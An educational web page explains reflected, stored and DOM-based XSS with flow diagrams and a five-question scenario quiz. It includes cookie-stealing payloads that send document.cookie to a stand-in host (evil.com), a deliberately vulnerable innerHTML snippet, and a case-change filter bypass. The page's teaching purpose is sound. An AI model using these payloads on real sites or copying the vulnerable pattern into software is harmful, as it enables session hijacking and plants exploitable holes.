Three Types of XSS

Not all XSS attacks work the same way. Knowing which type you are dealing with determines how it is found, how it spreads, and how it is fixed.

⏱️ ~25 min
🗂️ Type Explorer
🎯 Scenario Quiz
🔗 Match Game

🗂️ Three Types, One Root Cause

The root cause is always the same — unsanitized input rendered as HTML. What differs is where the payload lives and how it reaches the victim. Click each tab to explore.

🔁 Reflected XSS
The payload bounces off the server
The attacker puts the payload inside a URL. When a victim visits the URL, the server reads the parameter and writes it directly into the HTML response — the payload is "reflected" back and executed once. It is not stored anywhere.
😈 Attacker crafts URL
→sends link
😐 Victim clicks URL
→HTTP request
🖥️ Server reflects input
→HTML response
💀 Browser executes script
Stored in DB? No — lives only in the URL
Who is affected? Only users who click the malicious link
Common location: Search boxes, error messages, URL parameters
Severity: Medium — requires social engineering to deliver
Example URL https://shop.example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
💾 Stored XSS
The payload lives in the database
The attacker submits a payload through a form — a comment, profile field, or post. The server saves it to the database. Every time any user loads that page, the script is served to them and executed. One submission → many victims.
😈 Attacker submits form
→POST request
🗄️ Database stores payload
→page load
😐 Any Victim visits page
→HTML served
💀 Browser executes script
Stored in DB? Yes — persists until removed
Who is affected? Every user who loads the page
Common location: Comments, reviews, profile names, forum posts
Severity: High — no phishing needed, spreads automatically
Stored in comment field // Attacker submits this as a "comment":
Great post! <script>fetch('https://evil.com/?c='+document.cookie)</script>

// Now every visitor to the page has their cookie stolen
🌐 DOM-Based XSS
The payload never touches the server
The payload is read directly by JavaScript in the browser — from window.location.hash, location.search, or document.referrer. The server never sees the payload — making it harder to detect with server-side filters.
😈 Attacker crafts URL#hash
→sends link
😐 Victim clicks URL
→request (no hash)
🖥️ Server never sees payload
→page loads
💀 JS reads hash innerHTML = hash
Stored in DB? No — lives in the URL fragment (#)
Who is affected? Users who visit the crafted URL
Common location: window.location.hash, location.search written to DOM
Severity: High — bypasses server-side filters entirely
DOM-Based Vulnerable Code // Developer's code — reads the URL hash and writes it to the page
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = decodeURIComponent(hash);

// Attacker's URL:
https://site.com/page#%3Cimg+src%3Dx+onerror%3Dalert(1)%3E
// Payload never sent to server — browser executes it directly

🎯 Scenario Quiz — Which Type Is It?

Read each real-world scenario and select the XSS type it describes. You get instant feedback after each answer.

Scenario 1 Unanswered

A security researcher finds that a blog website saves user comments directly to a database without sanitizing them. She submits a comment containing <script>alert(document.cookie)</script>. The next morning, 500 users who visited the blog page all triggered the script.

Scenario 2 Unanswered

A pentester is testing a shopping website. He notices the search results page shows: "You searched for: laptop". He modifies the URL to include ?q=<script>alert(1)</script> and sends this URL to a colleague. When the colleague opens the link, the alert fires.

Scenario 3 Unanswered

A developer uses JavaScript to read window.location.hash and writes it directly to the page using innerHTML. An attacker crafts the URL https://site.com/#<img src=x onerror=alert(1)>. When the victim clicks it the script runs — but if you inspect the server logs, no payload ever appeared in the request.

Scenario 4 Unanswered

An attacker changes their profile display name on a social media site to <script>document.body.style.background='red'</script>. Every time another user views the attacker's profile or sees their name in a comment thread, the script executes in that user's browser.

Scenario 5 Unanswered

A web app has an error page that reads the message URL parameter and displays it: "Error: [message]". The server uses a WAF (Web Application Firewall) that blocks requests containing <script>. An attacker bypasses it using ?message=<SCRIPT>alert(1)</SCRIPT> with uppercase letters — and it works.
